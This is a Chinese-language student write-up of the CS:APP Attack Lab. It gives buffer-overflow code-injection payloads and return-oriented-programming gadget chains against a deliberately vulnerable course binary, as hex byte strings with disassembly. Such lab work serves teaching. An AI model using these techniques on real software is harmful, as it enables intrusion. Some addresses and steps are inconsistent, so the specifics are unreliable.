## 第一部分
### 第一关
根据文档攻击目标是getbbuf函数。查看其汇编代码
```
  0x000000000040173b <+0>:	sub    $0x28,%rsp
   0x000000000040173f <+4>:	mov    %rsp,%rdi
   0x0000000000401742 <+7>:	call   0x40197a <Gets>
   0x0000000000401747 <+12>:	mov    $0x1,%eax
   0x000000000040174c <+17>:	add    $0x28,%rsp
   0x0000000000401750 <+21>:	ret    
  ```
看出缓冲区大小为0x28,即40.所以应该先填充40个任意字符。
再找出touch1的地址为0x0000000000401751,所以这个地址要覆盖掉返回地址。
综上注入字节为`33 ...(一共四十个33)00 00 00 00 00 40 17 51`
转化为小端形式`33 ... 33(一共四十个33)51 17 40 00 00 00 00 00 `.
将上面的代码存在input.txt中，命令行输入`./hex2raw < input.txt | ./ctarget`，攻击成功。
调用get前后栈的情况如下图,其中黑线框中为栈中值，左边为地址(rsp和rip表示此时寄存器指向该地址)，右边为解释

![](https://raw.githubusercontent.com/HJLomega/bomblab_picture/master/attack_lab1.png)


### 第二关
首先得到touch2的地址为`0x000000000040177d`
我的cookie为0x7a742553,所以要让程序执行以下指令
```
movq $0x7a742553,%rdi
ret
 ```
下面生成机器代码，创建文件1_2.s，输入`movq $0x7a742553,%rdi `，然后输入以下命令
```
  gcc -c 1_2.s
  objdump -d 1_2.o > 1_2.d
 ```
在1_2.d中可得
```
48 c7 c7 53 25 74 7a    mov    $0x7a742553,%rdi
 ```
 所以`movq $0x7a742553,%rdi `的机器代码为`48 c7 c7 53 25 74 7a`。同理可得`ret `的机器代码为`c3`
思路是在字符串中注入上述代码，然后把返回地址该为getbuf的返回地址改为注入汇编代码的地址，并且把getbuf的返回地址的上面一个字改为touch2的地址，以此让注入的ret指令返回touch2。
为了做到以上步骤，必须先获得调用getbuf时栈底的地址。gbd断点获得rsp的值为`0x5563f200`
denug观察发现，代码的执行在一个字中是从右往左的，一个字节一个字节依此进行的，
所以注入代码为
```
c3 7a 74 25 53 c7 c7 48  
33 33 33 33 33 33 33 33
33 33 33 33 33 33 33 33
33 33 33 33 33 33 33 33
33 33 33 33 33 33 33 33
00 00 00 00 55 63 f1 d8
00 00 00 00 00 40 17 7d
```
改为小端表示法
```
48 c7 c7 53 25 74 7a c3
33 33 33 33 33 33 33 33
33 33 33 33 33 33 33 33 
33 33 33 33 33 33 33 33 
33 33 33 33 33 33 33 33 
d8 f1 63 55 00 00 00 00 
7d 17 40 00 00 00 00 00 
```
将上面的代码存在input.txt中，命令行输入`./hex2raw < input.txt | ./ctarget`,攻击成功
栈的情况如下图

![](https://raw.githubusercontent.com/HJLomega/bomblab_picture/master/attack_lab2.png)

### 第三关
首先得到touch3的地址为0x401851。
由题意知，应该执行以下指令。其中`$0x5563f210`是字符串的地址。将字符串放在getbuf的调用函数的栈中，防止被覆盖。
```
movq $0x5563f210,%rdi
ret
```
机器代码为
```
 48 c7 c7 10 f2 63 55 
 c3
```
思路是将cookie的string的Ascii码注入到栈中，然后把返回地址改为getbuf的返回地址改为注入汇编代码的地址，并且把getbuf的返回地址的上面一个字改为touch3的地址，以此让注入的ret指令返回touch3。
cookie对应字符串“7a742553”的Ascii码序列为`0x37 61 37 34 32 35 35 33 00`
所以注入代码为
```
c3 55 63 f2 10 c7 c7 48 
33 33 33 33 33 33 33 33
33 33 33 33 33 33 33 33
33 33 33 33 33 33 33 33
33 33 33 33 33 33 33 33
00 00 00 00 55 63 f1 d8
00 00 00 00 00 40 18 51
33 35 35 32 34 37 61 37
00 00 00 00 00 00 00 00 
```
改为小端表示法
```
48 c7 c7 10 f2 63 55 c3 
33 33 33 33 33 33 33 33 
33 33 33 33 33 33 33 33 
33 33 33 33 33 33 33 33 
33 33 33 33 33 33 33 33 
d8 f1 63 55 00 00 00 00 
51 18 40 00 00 00 00 00 
37 61 37 34 32 35 35 33 
00 00 00 00 00 00 00 00
```
将上面的代码存在input.txt中，命令行输入`./hex2raw < input.txt | ./ctarget`,攻击成功
栈的情况如下图

![](https://raw.githubusercontent.com/HJLomega/bomblab_picture/master/attack_lab3.png)

## 第二部分
### 第二关2.0
用python筛选，所有有用的gadget，如下
所有含89的
```c2 c7 ce
  4018df:	8d 87 48 89 c7 90    	lea    -0x6f3876b8(%rdi),%eax
  4018f3:	c7 07 68 89 c7 c3    	movl   $0xc3c78968,(%rdi)
  4018fa:	b8 48 89 c7 90       	mov    $0x90c78948,%eax
  401906:	c7 07 c8 89 c7 c3    	movl   $0xc3c789c8,(%rdi)
  40191f:	8d 87 89 ce 20 c0    	lea    -0x3fdf3177(%rdi),%eax
  401926:	b8 89 c2 08 d2       	mov    $0xd208c289,%eax
  40192c:	8d 87 89 ce 90 c7    	lea    -0x386f3177(%rdi),%eax
  401933:	c7 07 89 d1 c7 c5    	movl   $0xc5c7d189,(%rdi)
  40193a:	8d 87 89 ce c4 c9    	lea    -0x363b3177(%rdi),%eax
  401947:	8d 87 48 89 e0 94    	lea    -0x6b1f76b8(%rdi),%eax
  40194e:	b8 48 89 e0 c2       	mov    $0xc2e08948,%eax
  401954:	c7 07 8c 89 ce 90    	movl   $0x90ce898c,(%rdi)
  40195b:	c7 07 48 89 e0 c7    	movl   $0xc7e08948,(%rdi)
  401962:	c7 07 89 d1 38 c0    	movl   $0xc038d189,(%rdi)
  401969:	b8 89 d1 20 c9       	mov    $0xc920d189,%eax
  40196f:	c7 07 89 ce 18 c0    	movl   $0xc018ce89,(%rdi)
  401976:	b8 89 c2 84 c9       	mov    $0xc984c289,%eax
  40197c:	b8 89 ce c4 c0       	mov    $0xc0c4ce89,%eax
  40198f:	b8 89 c2 c7 88       	mov    $0x88c7c289,%eax
  401995:	8d 87 48 89 e0 c3    	lea    -0x3c1f76b8(%rdi),%eax
  4019a3:	8d 87 89 c2 a4 c0    	lea    -0x3f5b3d77(%rdi),%eax
  4019aa:	b8 89 c2 91 90       	mov    $0x9091c289,%eax
  4019b0:	c7 07 ac 89 c2 94    	movl   $0x94c289ac,(%rdi)
  4019b7:	c7 07 89 ce 94 db    	movl   $0xdb94ce89,(%rdi)
  4019c4:	b8 89 d1 00 db       	mov    $0xdb00d189,%eax
  4019ca:	b8 48 89 e0 c3       	mov    $0xc3e08948,%eax
  4019de:	b8 89 d1 30 c0       	mov    $0xc030d189,%eax
  4019e4:	b8 48 89 e0 c1       	mov    $0xc1e08948,%eax
  4019ea:	b8 48 89 e0 94       	mov    $0x94e08948,%eax
 ```
所有含5_的
```
  4018e6:	b8 58 90 c3 8a       	mov    $0x8ac39058,%eax
  4018ec:	8d 87 01 58 90 90    	lea    -0x6f6fa7ff(%rdi),%eax
  401900:	b8 39 6a 58 94       	mov    $0x94586a39,%eax
  40190d:	8d 87 55 58 94 c3    	lea    -0x3c6ba7ab(%rdi),%eax
 ```

所以应该执行以下汇编代码
```
popq %rdi
ret
```
但是找不到相应的popq指令，只有`popq %rax`,所以应该执行以下汇编代码
```
popq  %rax 
movq  %rax %rdi
ret  #<touch2>
```
这些指令分别位于
```
<gv116> 58 90 c3 8a c3   #popq %rax nop ret 地址为0x4018e7
4018df:	8d 87 48 89 c7 90    # movq  %rax %rdi 地址为0x4018e1 
```
所以注入代码为
```
33 33 33 33 33 33 33 33
33 33 33 33 33 33 33 33
33 33 33 33 33 33 33 33
33 33 33 33 33 33 33 33
33 33 33 33 33 33 33 33
00 00 00 00 00 40 18 e7
00 00 00 00 7a 74 25 53
00 00 00 00 00 40 18 e1
00 00 00 00 00 40 17 7d
```
化为小端
```
33 33 33 33 33 33 33 33 
33 33 33 33 33 33 33 33 
33 33 33 33 33 33 33 33 
33 33 33 33 33 33 33 33 
33 33 33 33 33 33 33 33 
e7 18 40 00 00 00 00 00 
53 25 74 7a 00 00 00 00 
e1 18 40 00 00 00 00 00 
7d 17 40 00 00 00 00 00
```
将上面的代码存在input.txt中，命令行输入`./hex2raw < input.txt | ./ctarget`,攻击成功.
栈的情况如下图
![](https://raw.githubusercontent.com/HJLomega/bomblab_picture/master/attack_lab4.png)

### 第三关2.0
注意到
```
000000000040191a <add_xy>:
  40191a:	48 8d 04 37          	lea    (%rdi,%rsi,1),%rax
  40191e:	c3    
```  
考虑到栈随机化，可以通过栈指针来获取栈地址。所以做法是，把栈指针%rsp和偏置分别送到%rdi和%rsi再调用`<add_xy>`,之后再把返回值送到%rdi即可。
把%rax送到%rdi有直接的gadget，而把%rax送到%rsi则需经过多次周转，其中`movl`抹去了地址的高4位00 00 7f ff,故应该再偏置中补全，再加上代码的偏置0x30所以偏置为`00 00 7f ff 00 `
gadget汇编代码为
```
popq %rax
mov %rax rdi
movq %rsp %rax
movl %eax %edx
movl %edx %ecx
movl %ecx %esi
ret # <add_xy>
movq %rax %rdi
ret # <touch3>
```
指令的地址为
```
<gv116> 58 90 c3 8a c3       # popq %rax nop ret 地址为0x4018e7
4018df:	8d 87 48 89 c7 90    # movq %rax %rdi 地址为0x4018e1 

401995:	8d 87 48 89 e0 c3    # movq %rsp %rax 地址为0x401997
401926:	b8 89 c2 08 d2       # movl %eax %edx 地址为0x401927
401962:	c7 07 89 d1 38 c0    # movl %edx %ecx cmpb  地址为0x401964
40191f:	8d 87 89 ce 20 c0    # movl %ecx %esi andbq 地址为0x401921
40191a:<add_xy> 
$rax正常 为7f ff ff fa 3d e8
4018df:	8d 87 48 89 c7 90    # movq %rax %rdi 地址为0x4018e1 
```
所以,代码为
```
33 33 33 33 33 33 33 33 
33 33 33 33 33 33 33 33 
33 33 33 33 33 33 33 33 
33 33 33 33 33 33 33 33 
33 33 33 33 33 33 33 33
00 00 00 00 00 40 18 e7
00 00 7f ff 00 00 00 30
00 00 00 00 00 40 18 e1
00 00 00 00 00 40 19 97
00 00 00 00 00 40 19 27
00 00 00 00 00 40 19 64
00 00 00 00 00 40 19 21
00 00 00 00 00 40 19 1a
00 00 00 00 00 40 18 e1
00 00 00 00 00 40 18 51
33 35 35 32 34 37 61 37
00 00 00 00 00 00 00 00
```
化为小端
```
33 33 33 33 33 33 33 33 
33 33 33 33 33 33 33 33 
33 33 33 33 33 33 33 33 
33 33 33 33 33 33 33 33 
33 33 33 33 33 33 33 33 
e7 18 40 00 00 00 00 00 
30 00 00 00 ff 7f 00 00 
e1 18 40 00 00 00 00 00 
97 19 40 00 00 00 00 00 
27 19 40 00 00 00 00 00 
64 19 40 00 00 00 00 00 
21 19 40 00 00 00 00 00 
1a 19 40 00 00 00 00 00 
e1 18 40 00 00 00 00 00 
51 18 40 00 00 00 00 00 
37 61 37 34 32 35 35 33 
00 00 00 00 00 00 00 00
```
将上面的代码存在input.txt中，命令行输入`./hex2raw < input.txt | ./ctarget`,攻击成功.
栈的情况如下图
![](https://raw.githubusercontent.com/HJLomega/bomblab_picture/master/attack_lab5.png)



